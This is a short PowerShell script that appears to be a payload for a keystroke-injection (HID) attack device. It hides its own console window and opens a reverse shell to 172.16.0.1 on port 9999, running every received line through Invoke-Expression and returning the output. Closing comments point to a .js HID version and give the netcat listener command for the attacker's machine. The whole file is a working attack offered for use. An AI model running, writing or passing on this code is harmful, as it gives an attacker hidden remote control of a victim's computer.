# Hide PowerShell Window
Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindow {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
"@
$hWnd = [ConsoleWindow]::FindWindow([NullString]::Value, [Console]::Title)
[ConsoleWindow]::ShowWindow($hWnd, 0)

# Create Reverse Shell on Port 9999
$address = "172.16.0.1"
$port = 9999
$socket = New-Object System.Net.Sockets.TcpClient($address, $port)
$stream = $socket.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$cmd = ""
while ($cmd -ne "exit") {
    $cmd = $reader.ReadLine()
    $output = Invoke-Expression $cmd 2>&1 | Out-String
    $writer.WriteLine($output)
}
$socket.Close()

# see .js file in this directory for the usable HID script version
# for usage: nc -lvp 9999 on attack machine
